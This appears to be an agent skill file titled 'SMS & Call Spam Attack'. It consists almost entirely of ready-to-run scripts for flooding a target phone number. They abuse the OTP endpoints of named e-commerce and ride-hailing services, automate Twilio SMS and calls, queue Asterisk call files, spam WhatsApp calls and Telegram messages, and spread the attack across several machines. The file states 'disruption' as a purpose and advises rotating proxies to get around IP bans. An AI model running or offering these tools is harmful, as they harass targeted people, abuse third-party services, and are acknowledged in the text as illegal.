---
name: sms-call-spam-attack
description: Mass SMS and call flooding attacks using APIs and bots.
tags: [spam, sms-bombing, call-flooding, dos, automation]
version: 1.0
author: RedMess
license: MIT
---

# SMS & Call Spam Attack

## When to Use
Use when performing SMS bombing or call flooding attacks on target phone numbers for testing or disruption.

## SMS Bombing

### Method 1: OTP API Abuse
```python
# sms_bomber.py
import requests
import time
import concurrent.futures

# List of services with SMS OTP
SERVICES = [
    {"url": "https://api.service1.com/otp/send", "method": "POST", "data": {"phone": "{phone}"}},
    {"url": "https://api.service2.com/verify", "method": "POST", "json": {"mobile": "{phone}"}},
    {"url": "https://api.service3.com/auth/request", "method": "GET", "params": {"number": "{phone}"}},
    {"url": "https://api.tokopedia.com/v1/otp", "method": "POST", "json": {"msisdn": "{phone}"}},
    {"url": "https://api.gojek.com/v3/customers/phone/otp", "method": "POST", "json": {"phone": "{phone}"}},
    {"url": "https://api.bukalapak.com/v2/authenticate.json", "method": "POST", "data": {"phone": "{phone}"}},
    {"url": "https://api.shopee.co.id/api/v1/otp/send", "method": "POST", "json": {"phone": "{phone}"}},
    {"url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "json": {"phoneNumber": "{phone}"}},
    {"url": "https://api.zalora.co.id/api/account/register", "method": "POST", "data": {"phone": "{phone}"}},
    {"url": "https://api.jdid.com/api/sms", "method": "POST", "json": {"mobile": "{phone}"}},
]

def send_sms(service, phone):
    try:
        url = service["url"].replace("{phone}", phone)
        
        if service["method"] == "POST":
            if "json" in service:
                data = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                       for k, v in service.get("json", {}).items()}
                r = requests.post(url, json=data, timeout=5)
            else:
                data = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                       for k, v in service.get("data", {}).items()}
                r = requests.post(url, data=data, timeout=5)
        else:
            params = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                     for k, v in service.get("params", {}).items()}
            r = requests.get(url, params=params, timeout=5)
        
        if r.status_code in [200, 201]:
            print(f"[+] SMS sent via {url}")
            return True
    except Exception as e:
        print(f"[-] Failed {url}: {e}")
    return False

def bomb_sms(phone, count=100):
    print(f"[*] Starting SMS bomb on {phone} with {count} messages")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for i in range(count):
            service = SERVICES[i % len(SERVICES)]
            executor.submit(send_sms, service, phone)
            time.sleep(0.1)  # Rate limit
    
    print("[*] SMS bombing completed")

if __name__ == "__main__":
    target = "+6281234567890"  # Target phone number
    bomb_sms(target, 500)
```

### Method 2: Twilio API (Requires Account)
```python
# twilio_sms_spam.py
from twilio.rest import Client
import time

# Twilio credentials
account_sid = 'YOUR_ACCOUNT_SID'
auth_token = 'YOUR_AUTH_TOKEN'
from_number = '+1234567890'  # Your Twilio number

client = Client(account_sid, auth_token)

def spam_sms(target, message, count):
    for i in range(count):
        try:
            msg = client.messages.create(
                body=f"{message} [{i+1}]",
                from_=from_number,
                to=target
            )
            print(f"[+] SMS {i+1} sent: {msg.sid}")
            time.sleep(1)
        except Exception as e:
            print(f"[-] Error: {e}")

target = "+6281234567890"
spam_sms(target, "Spam message", 100)
```

### Method 3: Android SMS Spammer App
```java
// SMSSpammer.java
import android.telephony.SmsManager;
import android.os.Handler;

public class SMSSpammer {
    private String targetNumber;
    private String message;
    private int count;
    
    public void startSpam(String number, String msg, int cnt) {
        this.targetNumber = number;
        this.message = msg;
        this.count = cnt;
        
        Handler handler = new Handler();
        for (int i = 0; i < count; i++) {
            final int index = i;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendSMS(targetNumber, message + " [" + index + "]");
                }
            }, i * 1000); // 1 second delay between SMS
        }
    }
    
    private void sendSMS(String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            System.out.println("[+] SMS sent: " + message);
        } catch (Exception e) {
            System.out.println("[-] SMS failed: " + e.getMessage());
        }
    }
}
```

## Call Flooding

### Method 1: VoIP Call Spammer
```python
# voip_call_flooder.py
import requests
import concurrent.futures

# VoIP services that offer free calls
VOIP_SERVICES = [
    "https://api.voip1.com/call",
    "https://api.voip2.com/initiate",
    "https://api.voip3.com/start_call",
]

def initiate_call(service, target):
    try:
        payload = {
            "to": target,
            "from": "+1234567890",
            "duration": 30
        }
        r = requests.post(service, json=payload, timeout=10)
        if r.status_code == 200:
            print(f"[+] Call initiated via {service}")
            return True
    except Exception as e:
        print(f"[-] Call failed: {e}")
    return False

def flood_calls(target, count=50):
    print(f"[*] Flooding {target} with {count} calls")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        for i in range(count):
            service = VOIP_SERVICES[i % len(VOIP_SERVICES)]
            executor.submit(initiate_call, service, target)
    
    print("[*] Call flooding completed")

if __name__ == "__main__":
    target = "+6281234567890"
    flood_calls(target, 100)
```

### Method 2: Asterisk PBX Call Flooding
```bash
# Install Asterisk
apt install asterisk

# Configure extensions.conf
cat >> /etc/asterisk/extensions.conf << 'EOF'
[spam-calls]
exten => s,1,Answer()
exten => s,n,Wait(1)
exten => s,n,Playback(hello-world)
exten => s,n,Hangup()
EOF

# Create call file
for i in {1..100}; do
cat > /var/spool/asterisk/outgoing/call_$i.call << EOF
Channel: SIP/+6281234567890@provider
Context: spam-calls
Extension: s
Priority: 1
MaxRetries: 2
RetryTime: 60
WaitTime: 30
EOF
sleep 1
done
```

### Method 3: Twilio Call Bomber
```python
# twilio_call_bomber.py
from twilio.rest import Client
import time

account_sid = 'YOUR_ACCOUNT_SID'
auth_token = 'YOUR_AUTH_TOKEN'
from_number = '+1234567890'

client = Client(account_sid, auth_token)

def call_bomb(target, count):
    for i in range(count):
        try:
            call = client.calls.create(
                url='http://demo.twilio.com/docs/voice.xml',
                to=target,
                from_=from_number
            )
            print(f"[+] Call {i+1} initiated: {call.sid}")
            time.sleep(2)
        except Exception as e:
            print(f"[-] Call failed: {e}")

target = "+6281234567890"
call_bomb(target, 50)
```

## WhatsApp Call Spam

### Method 1: WhatsApp Web Automation
```python
# whatsapp_call_spam.py
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
driver.get("https://web.whatsapp.com")

print("[*] Scan QR code to login")
time.sleep(20)  # Wait for manual QR scan

# Search contact
search_box = driver.find_element(By.XPATH, '//div[@contenteditable="true"][@data-tab="3"]')
search_box.click()
search_box.send_keys("+6281234567890")
time.sleep(2)

# Select contact
contact = driver.find_element(By.XPATH, '//span[@title="+6281234567890"]')
contact.click()
time.sleep(1)

# Spam calls
for i in range(50):
    call_button = driver.find_element(By.XPATH, '//span[@data-icon="video-call"]')
    call_button.click()
    time.sleep(1)
    
    # Cancel call after 3 seconds
    time.sleep(3)
    cancel_button = driver.find_element(By.XPATH, '//span[@data-icon="call-end"]')
    cancel_button.click()
    time.sleep(2)
    print(f"[+] Call {i+1} completed")

driver.quit()
```

## Telegram Spam Bot

### Spam Messages
```python
# telegram_spammer.py
from telethon.sync import TelegramClient
import time

api_id = YOUR_API_ID
api_hash = 'YOUR_API_HASH'
phone = '+6281234567890'

client = TelegramClient('session', api_id, api_hash)
client.start(phone)

def spam_user(username, message, count):
    for i in range(count):
        try:
            client.send_message(username, f"{message} [{i+1}]")
            print(f"[+] Message {i+1} sent")
            time.sleep(1)
        except Exception as e:
            print(f"[-] Error: {e}")

spam_user('@target_username', 'Spam message', 100)
```

## Advanced: Distributed SMS/Call Attack

### Master-Slave Architecture
```python
# master.py
import socket
import json

def distribute_attack(slaves, target, count):
    tasks = []
    per_slave = count // len(slaves)
    
    for i, slave in enumerate(slaves):
        task = {
            "target": target,
            "count": per_slave,
            "type": "sms"
        }
        tasks.append((slave, task))
    
    for slave_ip, task in tasks:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((slave_ip, 9999))
        sock.send(json.dumps(task).encode())
        sock.close()
        print(f"[+] Task sent to {slave_ip}")

slaves = ["192.168.1.10", "192.168.1.11", "192.168.1.12"]
distribute_attack(slaves, "+6281234567890", 1000)
```

## Pitfalls
1. **Rate limiting** - Services block after too many requests from same IP
2. **Phone verification** - Some APIs require verified phone numbers
3. **Legal consequences** - SMS/call bombing is illegal in most countries
4. **Carrier blocking** - Telcos may block spam numbers
5. **IP bans** - Use rotating proxies or VPN

## Verification
```bash
# Monitor success rate
python sms_bomber.py 2>&1 | grep -c "\[+\]"

# Check if target receives messages
# (requires access to target device)
```

## Related Skills
- blackhat-hacking
- api-router-proxy-cloning
- web-pentesting-tools